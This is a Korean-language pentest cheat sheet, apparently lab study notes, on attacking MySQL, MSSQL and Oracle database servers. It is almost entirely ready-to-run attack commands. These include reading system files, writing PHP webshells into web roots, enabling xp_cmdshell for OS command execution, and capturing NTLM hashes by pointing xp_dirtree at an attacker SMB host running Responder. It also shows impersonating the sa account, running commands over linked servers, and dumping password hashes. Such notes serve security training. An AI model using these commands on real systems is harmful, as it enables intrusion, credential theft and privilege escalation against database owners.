# 03. Database Services

## 📊 MySQL

### 파일 읽기 (Read Files)

시스템 파일에 접근하여 민감한 정보를 획득할 수 있습니다.

```mysql
select LOAD_FILE("/etc/passwd");
```

### 파일 쓰기 (Write Files)

웹쉘을 업로드하여 원격 명령 실행이 가능합니다.

```mysql
-- 파일 쓰기 권한 확인
show variables like "secure_file_priv";

-- 웹쉘 작성
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

---

## 🗄️ MSSQL (Microsoft SQL Server)
**기본 포트**: 1433

### 기본 데이터베이스 구조

MSSQL 설치 시 기본으로 생성되는 시스템 데이터베이스:

| 데이터베이스 | 용도 |
|-------------|------|
| `master` | 시스템 설정 및 메타데이터 저장 |
| `model` | 새 데이터베이스 생성 시 사용되는 템플릿 |
| `msdb` | SQL Server Agent, 백업, 작업 스케줄 정보 관리 |
| `tempdb` | 임시 데이터 및 임시 객체 저장 |
| `resource` | 시스템 객체 저장 (숨김 데이터베이스) |

### 데이터베이스 정보 조회

```mssql
-- 모든 데이터베이스 목록 조회
1> SELECT name FROM master.dbo.sysdatabases
2> GO

-- 특정 데이터베이스 선택
1> USE htbusers
2> GO

-- 테이블 목록 조회
1> SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
2> GO

-- 테이블 데이터 조회
1> SELECT * FROM users
2> go
```

### xp_cmdshell을 통한 명령 실행

xp_cmdshell은 운영체제 명령을 실행할 수 있는 강력한 저장 프로시저입니다.

```mssql
-- xp_cmdshell 활성화
EXECUTE sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
EXECUTE sp_configure 'xp_cmdshell', 1
GO
RECONFIGURE
GO

-- 명령 실행
xp_cmdshell 'whoami'
GO
```

### 파일 읽기 (Read Files)

OPENROWSET을 사용하여 시스템 파일을 읽을 수 있습니다.

```mssql
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO
```

### 파일 쓰기 (Write Files)

OLE Automation을 이용한 파일 생성 및 웹쉘 업로드가 가능합니다.

```mssql
-- OLE Automation 활성화
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO

-- 웹쉘 파일 작성
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```

### MSSQL 서비스 해시 캡처

UNC 경로를 이용하여 MSSQL 서비스 계정의 NTLM 해시를 획득할 수 있습니다.

```bash
# Responder를 이용한 해시 캡처
sudo responder -I tun0 -v

# SMB 서버 실행
sudo impacket-smbserver share ./ -smb2support
```

```mssql
-- UNC 경로 접근을 통한 해시 캡처
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO

1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> GO
```

### 사용자 권한 상승 (Impersonation)

IMPERSONATE 권한을 이용하여 다른 사용자로 권한을 전환할 수 있습니다.

```mssql
-- Impersonate 가능한 사용자 확인
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO

-- 현재 사용자 및 권한 확인
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go

-- sa 계정으로 권한 전환
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO
```

### 연결된 데이터베이스 서버 활용

Linked Server를 통해 다른 데이터베이스 서버와 통신할 수 있습니다.

```mssql
-- 연결된 서버 목록 조회
1> SELECT srvname, isremote FROM sysservers
2> GO

-- 원격 서버에서 명령 실행
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO
```

---

## 🏛️ Oracle TNS (Transparent Network Substrate)
**기본 포트**: 1521

### ODAT 도구 사용

```bash
# 모든 Oracle 취약점 자동 테스트
sudo odat.py all -s 10.129.204.235

# Oracle Instant Client 라이브러리 설정
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf"
sudo ldconfig
```

### SQLPlus를 통한 연결

```bash
# 일반 사용자로 연결
sqlplus scott/tiger@10.129.204.235/<oracle_sid>

# SYSDBA 권한으로 연결 (관리자 권한)
sqlplus scott/tiger@10.129.204.235/<oracle_sid> as sysdba
```

### 파일 업로드 (웹쉘)

```bash
# 웹 디렉터리에 파일 업로드
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```

### 유용한 SQL 쿼리

데이터베이스 정보 수집 및 권한 확인을 위한 쿼리입니다.

```sql
-- 모든 테이블 조회
SELECT table_name FROM all_tables;

-- 현재 사용자의 권한 확인
SELECT * FROM user_role_privs;

-- 사용자 계정 및 비밀번호 해시 조회
SELECT name, password FROM sys.user$;
```
